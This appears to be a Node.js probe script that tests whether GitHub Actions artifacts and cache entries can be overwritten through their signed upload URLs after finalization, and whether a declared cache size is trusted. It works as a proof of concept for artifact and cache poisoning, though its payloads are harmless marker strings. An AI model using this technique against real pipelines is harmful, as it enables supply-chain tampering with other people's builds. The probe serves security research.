const fs = require('fs')
const crypto = require('crypto')
const {execSync} = require('child_process')

const token = process.env.ACTIONS_RUNTIME_TOKEN
const base = new URL(process.env.ACTIONS_RESULTS_URL).origin
const mode = process.env.INPUT_MODE
const sha = b => crypto.createHash('sha256').update(b).digest('hex')

function backendIds () {
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString())
  console.log(`claim_keys=${Object.keys(claims).join(',')}`)
  const scope = String(claims.scp).split(' ').find(s => s.startsWith('Actions.Results:'))
  const [, runId, jobId] = scope.split(':')
  console.log(`scp_results_scope_parts=${scope.split(':').length} run=${runId} job=${jobId}`)
  return {workflowRunBackendId: runId, workflowJobRunBackendId: jobId}
}

async function twirpAt (service, method, body) {
  const headers = {'content-type': 'application/json', authorization: `Bearer ${token}`}
  const res = await fetch(`${base}/twirp/${service}/${method}`, {
    method: 'POST', headers, body: JSON.stringify(body)
  })
  const text = await res.text()
  console.log(`twirp ${method} -> ${res.status} ${text.slice(0, 500)}`)
  let json = {}
  try { json = text ? JSON.parse(text) : {} } catch (e) { console.log(`  (non-JSON body)`) }
  return {status: res.status, json}
}
const twirp = (method, body) =>
  twirpAt('github.actions.results.api.v1.ArtifactService', method, body)
const twirpCache = (method, body) =>
  twirpAt('github.actions.results.api.v1.CacheService', method, body)
// proto field names on the wire are snake_case (verified against captured
// official-runner traffic): signed_upload_url, workflow_run_backend_id, ...
const pick = (o, ...keys) => keys.map(k => o?.[k]).find(v => v !== undefined)

function makeZip (tag) {
  fs.writeFileSync('payload.txt', `${tag}\n`)
  execSync('rm -f blob.zip && zip -q -j blob.zip payload.txt')
  return fs.readFileSync('blob.zip')
}

function sas (u) {
  const p = new URL(u)
  return p.pathname
}

async function putBlob (url, bytes, headers = {}) {
  const res = await fetch(url, {method: 'PUT', headers, body: bytes})
  console.log(`PUT ${headers['x-ms-blob-type'] ? 'PutBlob' : headers.spec || 'block'} -> ${res.status} ${res.statusText} etag=${res.headers.get('etag')} x-ms-request-id=${res.headers.get('x-ms-request-id')}`)
  if (res.status >= 300) console.log(`  body: ${(await res.text()).slice(0, 300)}`)
  return res.status
}

async function main () {
  if (mode === 'cache') return cacheMode()
  const ids = backendIds()

  if (mode === 'upload') {
    const created = await twirp('CreateArtifact', {
      workflow_run_backend_id: ids.workflowRunBackendId,
      workflow_job_run_backend_id: ids.workflowJobRunBackendId,
      name: 'probe', version: 4
    })
    const uploadUrl = pick(created.json, 'signed_upload_url', 'signedUploadUrl')
    console.log(`upload_blob_path=${sas(uploadUrl)}`)
    fs.writeFileSync('/tmp/upload-url', uploadUrl)
    fs.appendFileSync(process.env.GITHUB_OUTPUT, `upload_url=${uploadUrl}\n`)
    const bytes = makeZip('ORIGINAL')
    fs.writeFileSync('/tmp/blob-a.zip', bytes)
    const code = await putBlob(uploadUrl, bytes, {'x-ms-blob-type': 'BlockBlob', 'content-type': 'application/zip', spec: 'original'})
    console.log(`PUT_PRE_FINALIZE=${code}`)
    await twirp('FinalizeArtifact', {
      workflow_run_backend_id: ids.workflowRunBackendId,
      workflow_job_run_backend_id: ids.workflowJobRunBackendId,
      name: 'probe', size: String(bytes.length), hash: `sha256:${sha(bytes)}`
    })
    return
  }

  // mutate mode: reuse the captured signed upload URL
  const uploadUrl = process.env.INPUT_UPLOAD_URL
  console.log(`reusing upload_blob_path=${sas(uploadUrl)}`)
  const bytes = makeZip('MUTATED')
  console.log(`mutation_sha256=${sha(bytes)}`)
  const blockId = Buffer.from('probe-mutation-block').toString('base64')

  const bu = new URL(uploadUrl); bu.searchParams.set('comp', 'block'); bu.searchParams.set('blockid', blockId)
  const blockCode = await putBlob(bu.toString(), bytes, {spec: 'Block(staged)', 'content-type': 'application/octet-stream'})
  console.log(`PUT_BLOCK_POST_FINALIZE=${blockCode}`)

  const lu = new URL(uploadUrl); lu.searchParams.set('comp', 'blocklist')
  const xml = `<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>${blockId}</Latest></BlockList>`
  const listRes = await fetch(lu.toString(), {method: 'PUT', headers: {'content-type': 'application/xml'}, body: xml})
  console.log(`PUT_BLOCKLIST_POST_FINALIZE=${listRes.status} ${listRes.statusText}`)
  if (listRes.status >= 300) console.log(`  body: ${(await listRes.text()).slice(0, 300)}`)

  const putCode = await putBlob(uploadUrl, bytes, {'x-ms-blob-type': 'BlockBlob', 'content-type': 'application/zip', spec: 'PutBlob'})
  console.log(`PUT_BLOB_POST_FINALIZE=${putCode}`)

  const idsSnake = {
    workflow_run_backend_id: ids.workflowRunBackendId,
    workflow_job_run_backend_id: ids.workflowJobRunBackendId
  }
  const list = await twirp('ListArtifacts', idsSnake)
  const found = (list.json.artifacts || []).find(a => a.name === 'probe')
  console.log(`listed_artifact=${JSON.stringify(found)}`)
  const signed = await twirp('GetSignedArtifactURL', {...idsSnake, name: 'probe'})
  const dlUrl = pick(signed.json, 'signed_url', 'signedUrl')
  console.log(`download_blob_path=${dlUrl ? sas(dlUrl) : 'none'}`)
  if (dlUrl) {
    const res = await fetch(dlUrl)
    const dl = Buffer.from(await res.arrayBuffer())
    console.log(`DOWNLOAD_STATUS=${res.status} bytes=${dl.length} sha256=${sha(dl)}`)
    fs.writeFileSync('/tmp/dl.zip', dl)
    try {
      console.log(`SERVED_PAYLOAD=${execSync('cd /tmp && rm -rf dlx && mkdir dlx && cd dlx && unzip -o -q /tmp/dl.zip && cat payload.txt').toString().trim()}`)
    } catch (e) { console.log(`SERVED_PAYLOAD_UNZIP_FAILED`) }
  }
}

async function cacheMode () {
  const put = (url, bytes) => fetch(url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'content-type': 'application/octet-stream'}, body: bytes})
  const run = process.env.GITHUB_RUN_ID
  const key = `probe-cache-${run}-${Date.now()}`
  const version = crypto.randomBytes(32).toString('hex')
  const created = await twirpCache('CreateCacheEntry', {key, version})
  const uploadUrl = pick(created.json, 'signed_upload_url', 'signedUploadUrl')
  console.log(`cache_key=${key}`)
  console.log(`cache_upload_path=${uploadUrl ? new URL(uploadUrl).pathname : 'none'} sp=${uploadUrl ? new URL(uploadUrl).searchParams.get('sp') : '-'}`)
  const A = Buffer.from('CACHE-A-ORIGINAL-BYTES\n')
  console.log(`CACHE_PUT_A=${(await put(uploadUrl, A)).status}`)
  const fin = await twirpCache('FinalizeCacheEntryUpload', {key, version, size_bytes: String(A.length)})
  console.log(`cache_entry_id=${pick(fin.json, 'entry_id', 'entryId')} declared_size=${A.length}`)
  const B = Buffer.from('CACHE-B-POST-FINALIZE-MUTATION\n')
  console.log(`CACHE_PUT_B_POST_FINALIZE=${(await put(uploadUrl, B)).status}`)
  let dlUrl = null
  for (let attempt = 1; attempt <= 6 && !dlUrl; attempt++) {
    const dl = await twirpCache('GetCacheEntryDownloadURL', {key, version, restore_keys: [key]})
    dlUrl = pick(dl.json, 'signed_download_url', 'signedDownloadUrl') || null
    console.log(`CACHE_LOOKUP attempt=${attempt} ok=${dl.json.ok} matched_key=${dl.json.matched_key || ''} path=${dlUrl ? new URL(dlUrl).pathname : 'none'}`)
    if (!dlUrl) await new Promise(r => setTimeout(r, 3000))
  }
  if (dlUrl) {
    console.log(`CACHE_DOWNLOAD_SP=${new URL(dlUrl).searchParams.get('sp')}`)
    const res = await fetch(dlUrl)
    const buf = Buffer.from(await res.arrayBuffer())
    console.log(`CACHE_DOWNLOAD_STATUS=${res.status} bytes=${buf.length} expected_A=${A.length} expected_B=${B.length}`)
    console.log(`CACHE_SERVED=${JSON.stringify(buf.toString())}`)
  }
  const again = await twirpCache('CreateCacheEntry', {key, version})
  console.log(`CACHE_RECREATE_SAME_KEY status=${again.status} body=${JSON.stringify(again.json).slice(0, 200)}`)
  // declared-size trust test on a second key
  const key2 = `probe-cache-size-${run}-${Date.now()}`
  const version2 = crypto.randomBytes(32).toString('hex')
  const c2 = await twirpCache('CreateCacheEntry', {key: key2, version: version2})
  const u2 = pick(c2.json, 'signed_upload_url', 'signedUploadUrl')
  const C = Buffer.from('CACHE-C-12B\n')
  console.log(`CACHE_PUT_C=${(await put(u2, C)).status} bytes=${C.length}`)
  const fin2 = await twirpCache('FinalizeCacheEntryUpload', {key: key2, version: version2, size_bytes: '1'})
  console.log(`CACHE_FINALIZE_DECLARED_1_ACTUAL_${C.length} status=${fin2.status} body=${JSON.stringify(fin2.json).slice(0, 200)}`)
  const dl2 = await twirpCache('GetCacheEntryDownloadURL', {key: key2, version: version2, restore_keys: [key2]})
  const du2 = pick(dl2.json, 'signed_download_url', 'signedDownloadUrl')
  if (du2) {
    const r2 = await fetch(du2)
    const b2 = Buffer.from(await r2.arrayBuffer())
    console.log(`CACHE2_SERVED status=${r2.status} bytes=${b2.length} body=${JSON.stringify(b2.toString())}`)
  } else {
    console.log(`CACHE2_LOOKUP ok=${dl2.json.ok} matched_key=${dl2.json.matched_key || ''}`)
  }
}

main().catch(e => { console.error(e); process.exit(1) })

